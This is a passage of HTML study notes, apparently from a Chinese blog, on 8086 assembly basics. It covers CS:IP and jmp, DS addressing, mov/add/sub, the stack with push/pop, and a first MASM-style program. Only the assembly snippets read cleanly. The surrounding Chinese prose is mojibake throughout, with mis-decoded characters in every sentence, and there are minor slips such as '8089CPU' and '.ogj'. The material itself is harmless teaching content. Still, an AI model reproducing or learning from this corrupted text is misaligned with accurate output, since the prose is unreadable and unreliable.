è¯»å–çš„æŒ‡ä»¤çš„é•¿åº¦ï¼Œä»è€ŒæŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</li><li>æ‰§è¡ŒæŒ‡ä»¤ï¼Œè½¬åˆ°æ­¥éª¤1ï¼Œé‡å¤è¿™ä¸ªè¿‡ç¨‹ã€‚</li></ul><p>&#x3D;&#x3D;ä¿®æ”¹CSå’ŒIPçš„æŒ‡ä»¤&#x3D;&#x3D;</p><ul><li><p>åœ¨CPUä¸­ï¼Œç¨‹åºå‘˜èƒ½å¤Ÿç”¨æŒ‡ä»¤è¯»å†™çš„éƒ¨ä»¶åªæœ‰å¯„å­˜å™¨ï¼Œç¨‹åºå‘˜å¯ä»¥é€šè¿‡æ”¹å˜å¯„å­˜å™¨ä¸­çš„å†…å®¹å®ç°å¯¹CPUçš„æ§åˆ¶</p></li><li><p>CPUä»ä½•å¤„æ‰§è¡ŒæŒ‡ä»¤æ˜¯ç”±CSã€IPä¸­çš„å†…å®¹å†³å®šçš„ï¼Œç¨‹åºå‘˜é€šè¿‡æ”¹å˜CSã€IPä¸­çš„å†…å®¹æ¥æ§åˆ¶CPU</p></li><li><p><code>MOV</code>æŒ‡ä»¤å¯ä»¥æ”¹å˜8089CPUå¤§éƒ¨åˆ†å¯„å­˜å™¨çš„å€¼ï¼Œè¢«ç§°ä¸ºä¼ é€æŒ‡ä»¤ï¼Œä½†æ˜¯ä¸èƒ½é€šè¿‡<code>MOV</code>æŒ‡ä»¤æ”¹å˜CSã€IPçš„å€¼</p></li><li><p>8086æä¾›äº†ä¸“é—¨çš„è½¬ç§»æŒ‡ä»¤æ¥ä¿®æ”¹CSã€IPçš„å€¼</p></li><li><p>åŒæ—¶ä¿®æ”¹CSã€IPçš„å†…å®¹ï¼š<br><code>jmp æ®µåœ°å€:åç§»åœ°å€</code><br>jmp 2AE3:3        -&gt;     ä»2AE33Hå¤„è¯»å–æŒ‡ä»¤<br>jmp 3:0B16        -&gt;     ä»00B46Hå¤„è¯»å–æŒ‡ä»¤</p><p><strong>åŠŸèƒ½ï¼šç”¨æŒ‡ä»¤ä¸­ç»™å‡ºçš„æ®µåœ°å€ä¿®æ”¹CSï¼Œåç§»åœ°å€ä¿®æ”¹IP</strong></p></li><li><p>ä»…ä¿®æ”¹IPçš„å†…å®¹</p><p><code>jmp æŸä¸€åˆæ³•å¯„å­˜å™¨</code></p><p>jmp ax (ç±»ä¼¼äº mov IPï¼Œax)</p><p>åŠŸèƒ½ï¼šç”¨å¯„å­˜å™¨ä¸­çš„å€¼ä¿®æ”¹IP</p></li></ul><h3 id="ä»£ç æ®µ"><a href="#ä»£ç æ®µ" class="headerlink" title="ä»£ç æ®µ"></a>ä»£ç æ®µ</h3><ul><li>å¯¹äº8086CPUæœºï¼Œåœ¨ç¼–ç¨‹æ—¶ï¼Œå¯ä»¥æ ¹æ®éœ€è¦ï¼Œå°†ä¸€ç»„å†…å­˜å•å…ƒå®šä¹‰ä¸ºä¸€ä¸ªæ®µ</li><li>å¯ä»¥å°†é•¿åº¦ä¸ºNçš„ä¸€ç»„ä»£ç ï¼Œå­˜åœ¨ä¸€ç»„åœ°å€è¿ç»­ã€èµ·å§‹åœ°å€ä¸º16çš„å€æ•°çš„å†…å­˜å•å…ƒä¸­ï¼Œè¿™æ®µå†…å­˜æ˜¯ç”¨æ¥å­˜æ”¾ä»£ç çš„ï¼Œä»è€Œå®šä¹‰äº†ä¸€ä¸ªä»£ç æ®µ</li></ul><h1 id="å¯„å­˜å™¨-å†…å­˜è®¿é—®"><a href="#å¯„å­˜å™¨-å†…å­˜è®¿é—®" class="headerlink" title="å¯„å­˜å™¨(å†…å­˜è®¿é—®)"></a>å¯„å­˜å™¨(å†…å­˜è®¿é—®)</h1><h3 id="DSå’Œ-address"><a href="#DSå’Œ-address" class="headerlink" title="DSå’Œ[address]"></a>DSå’Œ[address]</h3><ul><li>CPUè¦è¯»å–ä¸€ä¸ªå†…å­˜å•å…ƒçš„æ—¶å€™ï¼Œå¿…é¡»å…ˆç»™å‡ºè¿™ä¸ªå†…å­˜å•å…ƒçš„åœ°å€</li><li>åœ¨8086CPUä¸­ï¼Œå†…å­˜åœ°å€ç”±æ®µåœ°å€å’Œåç§»åœ°å€ç»„æˆ</li><li>8086CPUä¸­æœ‰ä¸€ä¸ª<strong>DSå¯„å­˜å™¨</strong>ï¼Œé€šå¸¸ç”¨æ¥å­˜æ”¾è¦è®¿é—®çš„æ•°æ®çš„æ®µåœ°å€</li></ul><p>ä¾‹å¦‚ï¼šæˆ‘ä»¬è¦è¯»å–10000Hå•å…ƒçš„å†…å®¹å¯ä»¥ç”¨å¦‚ä¸‹ç¨‹åºè¿›è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov bx,1000H</span><br><span class="line">mov ds,bx    ;ä¸ºä»€ä¹ˆè¦è½¬ä¸€æ¬¡ï¼Ÿ8086ä¸æ”¯æŒå°†æ•°æ®ç›´æ¥é€å…¥æ®µå¯„å­˜å™¨</span><br><span class="line">mov al, [0]    ;å°†10000H(1000:0)ä¸­çš„æ•°æ®è¯»åˆ°alä¸­</span><br></pre></td></tr></table></figure><p>è§£é‡Šï¼š</p><ul><li>å‰é¢å·²çŸ¥movæŒ‡ä»¤å¯ä»¥å°†<strong>æ•°æ®ç›´æ¥é€å…¥å¯„å­˜å™¨</strong>ï¼Œæˆ–è€…<strong>å°†ä¸€ä¸ªå¯„å­˜å™¨ä¸­çš„å†…å®¹é€å…¥å¦ä¸€ä¸ªå¯„å­˜å™¨</strong></li><li>é™¤æ­¤ä¹‹å¤–ï¼ŒmovæŒ‡ä»¤è¿˜å¯ä»¥å°†ä¸€ä¸ª<strong>å†…å­˜å•å…ƒ</strong>ä¸­çš„å†…å®¹é€å…¥ä¸€ä¸ªå¯„å­˜å™¨</li><li>æ ¼å¼ï¼š<code>mov å¯„å­˜å™¨å,å†…å­˜å•å…ƒåœ°å€</code></li><li>[Â·Â·Â·]è¡¨ç¤ºä¸€ä¸ªå†…å­˜å•å…ƒï¼Œâ€œ[Â·Â·Â·]â€ä¸­çš„0è¡¨ç¤ºå†…å­˜å•å…ƒçš„åç§»åœ°å€</li><li>è€ŒCPUè‡ªåŠ¨è¯»å–DSä¸­çš„æ•°æ®ä½œä¸ºå†…å­˜å•å…ƒçš„æ®µåœ°å€</li><li>æ­¤æ—¶ï¼Œè¯»å–åˆ°çš„å†…å­˜å•å…ƒå°±æ˜¯ï¼šDS:åç§»åœ°å€</li></ul><h3 id="movã€addã€subæŒ‡ä»¤"><a href="#movã€addã€subæŒ‡ä»¤" class="headerlink" title="movã€addã€subæŒ‡ä»¤"></a>movã€addã€subæŒ‡ä»¤</h3><p>movå·²å­¦çš„å‡ ç§æŒ‡ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov å¯„å­˜å™¨,æ•°æ®     ;mov ax 8</span><br><span class="line">mov å¯„å­˜å™¨,å¯„å­˜å™¨    ;mov ax,bx</span><br><span class="line">mov å¯„å­˜å™¨,å†…å­˜å•å…ƒ  ;mov ax,[0]  ;åè¿‡æ¥ä¹Ÿæ˜¯å¯ä»¥çš„</span><br><span class="line">mov æ®µå¯„å­˜å™¨,å¯„å­˜å™¨  ;mov ds,ax   ;åè¿‡æ¥ä¹Ÿæ˜¯å¯ä»¥çš„</span><br></pre></td></tr></table></figure><p>addå’ŒsubåŒmovä¸€æ ·ï¼Œéƒ½æœ‰ä¸¤ä¸ªæ“ä½œå¯¹è±¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add å¯„å­˜å™¨,æ•°æ®       ;add ax,8</span><br><span class="line">add å¯„å­˜å™¨,å¯„å­˜å™¨      ;add ax,bx</span><br><span class="line">add å¯„å­˜å™¨,å†…å­˜å•å…ƒ    ;add ax,[0]</span><br><span class="line">add å†…å­˜å•å…ƒ,å¯„å­˜      ;add [0],ax</span><br></pre></td></tr></table></figure><h3 id="æ•°æ®æ®µ"><a href="#æ•°æ®æ®µ" class="headerlink" title="æ•°æ®æ®µ"></a>æ•°æ®æ®µ</h3><p>å¯¹äº8086CPUï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®éœ€è¦å°†ä¸€ç»„å†…å­˜å•å…ƒå®šä¹‰ä¸ºä¸€ä¸ªæ®µ(å¯ä»¥æ˜¯ä»£ç æ®µã€æ•°æ®æ®µç­‰)</p><p>æˆ‘ä»¬å¯ä»¥å°†ä¸€ç»„é•¿åº¦ä¸ºNã€åœ°å€è¿ç»­ã€èµ·å§‹åœ°å€ä¸º16çš„å€æ•°çš„å†…å­˜å•å…ƒå½“åšä¸“é—¨å­˜å‚¨æ•°æ®çš„å†…å­˜ç©ºé—´ï¼Œä»è€Œå®šä¹‰äº†ä¸€ä¸ªæ•°æ®æ®µã€‚</p><p>æ¯”å¦‚ç”¨123B0H~123B9Hè¿™æ®µç©ºé—´æ¥å­˜æ”¾æ•°æ®ï¼š</p><ul><li>æ®µåœ°å€ï¼š123BH</li><li>é•¿åº¦ï¼š10å­—èŠ‚</li></ul><blockquote><p>æ•°æ®æ®µçš„è®¿é—®</p></blockquote><p>ä¾‹å¦‚ï¼šå°†123B0H~123B9Hçš„å†…å­˜ç©ºé—´å®šä¹‰ä¸ºæ•°æ®æ®µï¼Œå¹¶ç´¯åŠ è¿™ä¸ªæ•°æ®æ®µä¸­å‰ä¸‰ä¸ªå•å…ƒä¸­çš„æ•°æ®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,123BH</span><br><span class="line">mov ds,ax   ;å®šä¹‰æ•°æ®æ®µçš„æ®µåœ°å€</span><br><span class="line">mov al,0   ;ç”¨alå­˜æ”¾ç´¯åŠ ç»“æœ</span><br><span class="line">add al,[0]  ;ä¸ºä»€ä¹ˆç”¨alï¼Ÿç”¨axçš„è¯æ˜¯16ä½ï¼Œé‚£ä¹ˆå–[0]çš„æ•°æ®(8ä½)çš„æ—¶å€™ä¼šè‡ªåŠ¨åŠ ä¸Šé«˜ä½ä¸€èµ·</span><br><span class="line">add al,[1]</span><br><span class="line">add al,[2]</span><br></pre></td></tr></table></figure><h3 id="æ ˆ"><a href="#æ ˆ" class="headerlink" title="æ ˆ"></a>æ ˆ</h3><p>ç‰¹æ€§ï¼šå…ˆè¿›åå‡º(LIFO)last in first out</p><p>8086CPUæä¾›å…¥æ ˆå’Œå‡ºæ ˆçš„æŒ‡ä»¤(æœ€åŸºæœ¬çš„)ï¼š[å…¥æ ˆå’Œå‡ºæ ˆçš„æ“ä½œéƒ½æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½è¿›è¡Œçš„]</p><p>PUSH (å…¥æ ˆ)</p><p>â€‹<code>push ax</code>  å°†å¯„å­˜å™¨axä¸­çš„æ•°æ®é€å…¥æ ˆä¸­</p><p>POP (å‡ºæ ˆ) </p><p>â€‹<code>pop ax</code>ä»æ ˆé¡¶å»é™¤æ•°æ®é€å…¥axã€‚</p><p><strong>cpuå¦‚ä½•çŸ¥é“å½“å‰è¦æ‰§è¡Œçš„æŒ‡ä»¤æ‰€åœ¨çš„ä½ç½®ï¼Ÿ</strong></p><p>ç­”ï¼šå¯„å­˜å™¨CSå’ŒIPä¸­å­˜æ”¾ç€å½“å‰æŒ‡ä»¤çš„æ®µåœ°å€å’Œåç§»åœ°å€</p><p>8086CPUä¸­ï¼Œæœ‰ä¸¤ä¸ªå¯„å­˜å™¨ï¼š</p><ul><li>æ®µå¯„å­˜å™¨SSå­˜æ”¾æ ˆé¡¶çš„æ®µåœ°å€</li><li>å¯„å­˜å™¨SP    å­˜æ”¾æ ˆé¡¶çš„åç§»åœ°å€</li></ul><p><code>ä»»æ„æ—¶åˆ»ï¼šSS:SPæŒ‡å‘æ ˆé¡¶å…ƒç´ </code></p><p>&#x3D;&#x3D;popæŒ‡ä»¤çš„æ‰§è¡Œè¿‡ç¨‹[pushåŒç†]&#x3D;&#x3D;</p><p><code>pop ax</code></p><ul><li>å°†SS:SPæŒ‡å‘çš„å†…å­˜å•å…ƒå¤„çš„æ•°æ®é€å…¥axä¸­</li><li>SP&#x3D;SP+2[pushçš„è¯å°±æ˜¯SP-2]ï¼ŒSS:SPæŒ‡å‘å½“å‰æ ˆé¡¶ä¸‹é¢çš„å•å…ƒï¼Œä»¥å½“å‰æ ˆé¡¶ä¸‹é¢çš„å•å…ƒä¸ºæ–°çš„æ ˆé¡¶</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231031135144429.png" alt="image-20231031135144429" style="zoom:25%;" /><h4 id="æ ˆé¡¶è¶Šç•Œ"><a href="#æ ˆé¡¶è¶Šç•Œ" class="headerlink" title="æ ˆé¡¶è¶Šç•Œ"></a>æ ˆé¡¶è¶Šç•Œ</h4><p>8086CPUçš„å·¥ä½œæœºç†ï¼šåªè€ƒè™‘å½“å‰çš„æƒ…å†µ</p><ul><li>å½“å‰æ ˆé¡¶åœ¨ä½•å¤„</li><li>å½“å‰è¦æ‰§è¡Œçš„æŒ‡ä»¤æ˜¯é‚£ä¸€æ¡</li><li>CPUå¹¶ä¸ä¼šçŸ¥é“æ ˆé¡¶åœ¨å“ªé‡Œ    â€”&gt;    å­˜åœ¨æ ˆæº¢å‡ºçš„é—®é¢˜</li></ul><h4 id="pushã€pop"><a href="#pushã€pop" class="headerlink" title="pushã€pop"></a>pushã€pop</h4><p>&#x3D;&#x3D;pushå’ŒpopæŒ‡ä»¤çš„æ ¼å¼(1)&#x3D;&#x3D;</p><ul><li><code>push å¯„å­˜å™¨</code>  å°†ä¸€ä¸ªå¯„å­˜å™¨ä¸­çš„æ•°æ®å…¥æ ˆ         ;push ax</li><li><code>pop å¯„å­˜å™¨</code>  å‡ºæ ˆï¼Œç”¨ä¸€ä¸ªå¯„å­˜å™¨æ¥æ”¶å‡ºæ ˆçš„æ•°æ®        ;pop bx</li></ul><p>&#x3D;&#x3D;pushå’ŒpopæŒ‡ä»¤çš„æ ¼å¼(2)&#x3D;&#x3D;</p><ul><li><code>push æ®µå¯„å­˜å™¨</code>  å°†ä¸€ä¸ªæ®µå¯„å­˜å™¨ä¸­çš„æ•°æ®å…¥æ ˆ        ;push ds</li><li><code>pop æ®µå¯„å­˜å™¨</code>å‡ºæ ˆï¼Œç”¨ä¸€ä¸ªæ®µå¯„å­˜å™¨æ¥æ”¶å‡ºæ ˆçš„æ•°æ®          ;pop es</li></ul><p>&#x3D;&#x3D;pushå’ŒpopæŒ‡ä»¤çš„æ ¼å¼(3)&#x3D;&#x3D;</p><ul><li><code>push å†…å­˜å•å…ƒ</code>  å°†ä¸€ä¸ªå†…å­˜å•å…ƒå¤„çš„<strong>å­—</strong>å…¥æ ˆ[æ ˆæ“ä½œéƒ½æ˜¯ä»¥å­—ä¸ºå•ä½]        ;push [0]</li><li><code>pop å†…å­˜å•å…ƒ</code>å‡ºæ ˆï¼Œç”¨ä¸€ä¸ªå†…å­˜å­—å•å…ƒæ¥æ”¶å‡ºæ ˆçš„æ•°æ®       ;pop [2]</li></ul><p>æŒ‡ä»¤å®è¡Œæ—¶ï¼ŒCPUè¦çŸ¥é“å†…å­˜å•å…ƒçš„åœ°å€ï¼Œå¯ä»¥åœ¨pushï¼ŒpopæŒ‡ä»¤ä¸­ç»™å‡ºå†…å­˜å•å…ƒçš„åç§»åœ°å€ï¼Œæ®µåœ°å€åœ¨æŒ‡ä»¤æ‰§è¡Œçš„æ‰‹CPUä»dsä¸­å–å¾—</p><h5 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h5><p>å°†10000H~1000FHè¿™æ®µç©ºé—´å½“åšæ ˆï¼Œåˆå§‹çŠ¶æ€æ˜¯ç©ºçš„ï¼Œè®¾ç½®AX&#x3D;002AHï¼ŒBX&#x3D;002BHï¼Œåˆ©ç”¨æ ˆï¼Œäº¤æ¢AXå’ŒBXä¸­çš„æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1000H</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,0010H        ;åˆå§‹åŒ–æ ˆé¡¶SS:SPæŒ‡å‘10010H</span><br><span class="line">mov ax,002AH          </span><br><span class="line">mov bx,002BH</span><br><span class="line">push ax             ;axçš„å€¼ä¼ è¿›å»002AH</span><br><span class="line">push bx             ;bxçš„å€¼ä¼ å…¥002BH</span><br><span class="line">pop ax              ;å‡ºæ ˆ,æŠŠæ ˆé¡¶æ•°æ®002BH[åŸæ¥axçš„æ•°æ®]ä¼ ç»™ax</span><br><span class="line">pop bx              ;åŒä¸Š</span><br></pre></td></tr></table></figure><h4 id="æ ˆæ®µ"><a href="#æ ˆæ®µ" class="headerlink" title="æ ˆæ®µ"></a>æ ˆæ®µ</h4><p>æˆ‘ä»¬å¯ä»¥å°†ä¸€ç»„é•¿åº¦ä¸ºNã€åœ°å€è¿ç»­ã€èµ·å§‹åœ°å€ä¸º16çš„å€æ•°çš„å†…å­˜å•å…ƒå½“åšæ ˆæ¥ä½¿ç”¨ï¼Œä»è€Œå®šä¹‰äº†ä¸€ä¸ªæ ˆæ®µã€‚</p><h1 id="ç¬¬ä¸€ä¸ªç¨‹åº"><a href="#ç¬¬ä¸€ä¸ªç¨‹åº" class="headerlink" title="ç¬¬ä¸€ä¸ªç¨‹åº"></a>ç¬¬ä¸€ä¸ªç¨‹åº</h1><h3 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h3><p>ä¸€ä¸ªæ±‡ç¼–è¯­è¨€ç¨‹åºä»å†™å‡ºåˆ°æœ€ç»ˆæ‰§è¡Œçš„ç®€è¦è¿‡ç¨‹ï¼š</p><ul><li>ç¼–å†™    â€”&gt;    .asm</li><li>ç¼–è¯‘è¿æ¥    â€”&gt;    å¯¹æºç¨‹åºæ–‡ä»¶ä¸­çš„æºç¨‹åºè¿›è¡Œç¼–è¯‘äº§ç”Ÿç›®æ ‡æ–‡ä»¶    â€”&gt;    .ogj    â€”&gt;    å†ç”¨è¿æ¥ç¨‹åºå¯¹ç›®æ ‡æ–‡ä»¶è¿›è¡Œè¿æ¥ï¼Œç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶    â€”&gt;    .exe<ul><li>å¯æ‰§è¡Œæ–‡ä»¶åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼š<ul><li>ç¨‹åº(ä»æºç¨‹åºä¸­çš„æ±‡ç¼–æŒ‡ä»¤ç¿»è¯‘è¿‡æ¥çš„æœºå™¨ç )å’Œæ•°æ®(æºç¨‹åºä¸­å®šä¹‰çš„æ•°æ®)</li><li>ç›¸å…³çš„æè¿°ä¿¡æ¯(æ¯”å¦‚ï¼šç¨‹åºçš„å¤§å°å’Œå ç”¨çš„å†…å­˜ç©ºé—´ç­‰)</li></ul></li></ul></li><li>æ‰§è¡Œ    â€”&gt;    æ“ä½œç³»ç»Ÿä¾ç…§å®¢æˆ·è‡ªè¡Œæ–‡ä»¶ä¸­çš„æè¿°ä¿¡æ¯ï¼Œå°†å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„æœºå™¨ç å’Œæ•°æ®åŠ è½½å…¥å†…å­˜ï¼Œå¹¶è¿›è¡Œç›¸å…³çš„åˆå§‹åŒ–(æ¯”å¦‚ï¼šè®¾ç½®CS:IPæŒ‡å‘ç¬¬ä¸€æ¡è¦æ‰§è¡Œçš„æŒ‡ä»¤)ï¼Œç„¶åç”±CPUæ‰§è¡Œç¨‹åº</li></ul><h3 id="æºç¨‹åº"><a href="#æºç¨‹åº" class="headerlink" title="æºç¨‹åº"></a>æºç¨‹åº</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">;1.asm</span><br><span class="line">assume cs:codesg ;å°†ç”¨ä½œä»£ç æ®µçš„æ®µcodesgå’Œæ®µå¯„å­˜å™¨csè”ç³»èµ·æ¥ã€‚</span><br><span class="line"></span><br><span class="line">codesg segment ;å®šä¹‰ä¸€ä¸ªæ®µï¼Œæ®µçš„åç§°ä¸ºâ€œcodesgâ€ï¼Œè¿™ä¸ªæ®µä»æ­¤å¼€å§‹</span><br><span class="line">   ;codesgæ˜¯ä¸€ä¸ªæ ‡å·ï¼Œä½œä¸ºä¸€ä¸ªæ®µçš„åç§°ï¼Œæœ€ç»ˆè¢«ç¼–è¯‘è¿æ¥æˆä¸€ä¸ªæ®µçš„æ®µåœ°å€</span><br><span class="line"></span><br><span class="line">mov ax, 0123H</span><br><span class="line">mov bx, 0456H </span><br><span class="line">add ax, bx</span><br><span class="line">add ax, ax </span><br><span class="line"></span><br><span class="line">mov ax, 4c00H </span><br><span class="line">int 21H ;è¿™ä¸¤æ¡æŒ‡ä»¤å®ç°ç¨‹åºçš„è¿”å›</span><br><span class="line"></span><br><span class="line">codesg ends ;åç§°ä¸ºâ€œcodesgâ€çš„æ®µåˆ°æ­¤ç»“æŸ</span><br><span class="line"></span><br><span class="line">end ;ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ±‡ç¼–ç¨‹åºçš„è¿‡ç¨‹ä¸­ï¼Œç¢°åˆ°äº†ä¼ªæŒ‡ä»¤endï¼Œç»“æŸå¯¹æºç¨‹åºçš„ç¼–è¯‘</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="ä¼ªæŒ‡ä»¤"><a href="#ä¼ªæŒ‡ä»¤" class="headerlink" title="ä¼ªæŒ‡ä»¤"></a>ä¼ªæŒ‡ä»¤</h4><p>åœ¨æ±‡ç¼–è¯­è¨€æºç¨‹åºä¸­ï¼ŒåŒ…å«ä¸¤ç§æŒ‡ä»¤ï¼Œä¸€ç§æ˜¯æ±‡ç¼–æŒ‡ä»¤ï¼Œä¸€ç§æ˜¯ã€‚ä¼ªæŒ‡ä»¤æ²¡æœ‰å¯¹åº”çš„æœºå™¨ç çš„æŒ‡ä»¤ï¼Œæœ€ç»ˆä¸è¢«CPUæ‰§è¡Œã€‚ä¼ªæŒ‡ä»¤æ˜¯ç”±<strong>ç¼–è¯‘å™¨</strong>æ¥æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œç¼–è¯‘å™¨æ ¹æ®ä¼ªæŒ‡ä»¤æ¥è¿›è¡Œç›¸å…³çš„ç¼–è¯‘å·¥ä½œã€‚</p><p>&#x3D;&#x3D;å®šä¹‰ä¸€ä¸ªæ®µ&#x3D;&#x3D;</p><ul><li>**<code>segment</code><strong>å’Œ</strong><code>ends</code>**æ˜¯ä¸€å¯¹æˆå¯¹ä½¿ç”¨çš„ä¼ªæŒ‡ä»¤ï¼Œè¿™æ˜¯åœ¨å†™å¯ä»¥è¢«ç¼–è¯‘å™¨ç¼–è¯‘çš„æ±‡ç¼–ç¨‹åºæ—¶ï¼Œå¿…é¡»ç”¨åˆ°çš„ä¸€å¯¹ä¼ªæŒ‡ä»¤</li><li><strong><code>segment</code><strong>å’Œ</strong><code>ends</code><strong>çš„åŠŸèƒ½æ˜¯</strong>å®šä¹‰ä¸€ä¸ªæ®µ</strong>ï¼Œsegmentè¯´æ˜ä¸€ä¸ªæ®µçš„å¼€å§‹ï¼Œendsè¯´æ˜ä¸€ä¸ªæ®µçš„ç»“æŸ</li><li>ä¸€ä¸ªæ®µå¿…é¡»æœ‰ä¸€ä¸ªåç§°æ¥æ ‡è¯†ï¼Œä½¿ç”¨æ ¼å¼ä¸ºï¼š<ul><li><code>æ®µå segment</code></li><li><code>æ®µå ends</code></li></ul></li><li>ä¸€ä¸ªæ±‡ç¼–ç¨‹åºç”±å¤šä¸ªæ®µç»„æˆï¼Œè¿™äº›æ®µç”¨æ¥å­˜æ”¾ä»£ç ã€æ•°æ®æˆ–è¢«å½“åšæ ˆç©ºé—´ä½¿ç”¨ã€‚ä½†æ˜¯ä¸€ä¸ªç¨‹åºè‡³å°‘æœ‰ä¸€ä¸ªæ®µ</li></ul><p>&#x3D;&#x3D;End&#x3D;&#x3D;</p><ul><li>Endæ˜¯ä¸€ä¸ªæ±‡ç¼–ç¨‹åºçš„ç»“æŸæ ‡è®°ï¼Œç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ±‡ç¼–ç¨‹åºçš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœç¢°åˆ°äº†ä¼ªæŒ‡ä»¤endï¼Œå°±ç»“æŸå¯¹æºç¨‹åºçš„ç¼–è¯‘</li><li>æ³¨æ„ä¸è¦ææ··äº†endå’Œendsã€‚endsæ˜¯å’Œsegmentæˆå¯¹ä½¿ç”¨çš„æ ‡è®°ä¸€ä¸ªæ®µçš„ç»“æŸï¼Œendså¯ä»¥ç†è§£ä¸º<code>end segment</code></li></ul><p>&#x3D;&#x3D;assume&#x3D;&#x3D;</p><ul><li><code>assume</code>:å«ä¹‰ä¸ºâ€™å‡è®¾â€™</li><li>å®ƒå‡è®¾æŸä¸€æ®µå¯„å­˜å™¨å’Œç¨‹åºä¸­çš„æŸä¸€ä¸ªç”¨<code>segmentÂ·Â·Â·ends</code>å®šä¹‰çš„æ®µç›¸å…³è”</li><li>é€šè¿‡<code>assume</code>è¯´æ˜è¿™ç§å…³è”ï¼Œåœ¨éœ€è¦çš„æƒ…å†µä¸‹ï¼Œç¼–è¯‘ç¨‹åºå¯ä»¥å°†å¸¦å¯„å­˜å™¨å’ŒæŸä¸ªå…·ä½“çš„æ®µç›¸å…³è”</li><li>assumeå¹¶ä¸æ˜¯ä¸€æ¡éè¦æ·±å…¥ç†è§£ä¸å¯çš„ä¼ªæŒ‡ä»¤ï¼Œä»¥åæˆ‘ä»¬ç¼–ç¨‹çš„æ—¶å€™ï¼Œè®°å¾—ç”¨ç‰¹å®šç”¨é€”çš„æ®µå’Œç›¸å…³çš„æ®µå¯„å­˜å™¨å…³è”èµ·æ¥å³å¯</li><li><code>assume cs:codesg </code>  å°†ç”¨ä½œä»£ç æ®µçš„æ®µcodesgå’Œæ®µå¯„å­˜å™¨csè”ç³»èµ·æ¥ã€‚</li></ul><h4 id="æ±‡ç¼–æŒ‡ä»¤"><a href="#æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="æ±‡ç¼–æŒ‡ä»¤"></a>æ±‡ç¼–æŒ‡ä»¤</h4><p>æœ‰å¯¹åº”çš„æœºå™¨ç çš„æŒ‡ä»¤ï¼Œå¯ä»¥è¢«ç¼–è¯‘ä¸ºæœºå™¨æŒ‡ä»¤ï¼Œæœ€ç»ˆä¸ºCPUæ‰€æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov bx,0456H</span><br><span class="line">add ax,bx</span><br></pre></td></tr></table></figure><p>è¿™äº›å°±æ˜¯ä¸€äº›æ±‡ç¼–æŒ‡ä»¤ï¼Œå¯ä»¥å’Œæœºå™¨æŒ‡ä»¤ä¸€ä¸€å¯¹åº”</p><h4 id="æ ‡å·"><a href="#æ ‡å·" class="headerlink" title="æ ‡å·"></a>æ ‡å·</h4><p>æ±‡ç¼–æºç¨‹åºä¸­ï¼Œé™¤äº†æ±‡ç¼–æŒ‡ä»¤å’Œä¼ªæŒ‡ä»¤å¤–ï¼Œè¿˜æœ‰ä¸€äº›æ ‡å·ï¼Œæ¯”å¦‚â€codesgâ€</p><ul><li>ä¸€ä¸ªæ ‡å·æŒ‡ä»£äº†ä¸€ä¸ªåœ°å€</li><li>codesgï¼šæ”¾åœ¨segmentçš„å‰é¢ï¼Œä½œä¸ºä¸€ä¸ªæ®µçš„åç§°ï¼Œè¿™ä¸ªæ®µçš„åç§°æœ€ç»ˆå°†è¢«ç¼–è¯‘ã€è¿æ¥ç¨‹åºå¤„ç†ä¸ºä¸€ä¸ªæ®µçš„æ®µåœ°å€</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assume cs:psych</span><br><span class="line">aaa segment</span><br><span class="line">mov ax,2</span><br><span class="line">add ax,ax</span><br><span class="line">psych ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h4 id="ç¨‹åºè¿”å›"><a href="#ç¨‹åºè¿”å›" class="headerlink" 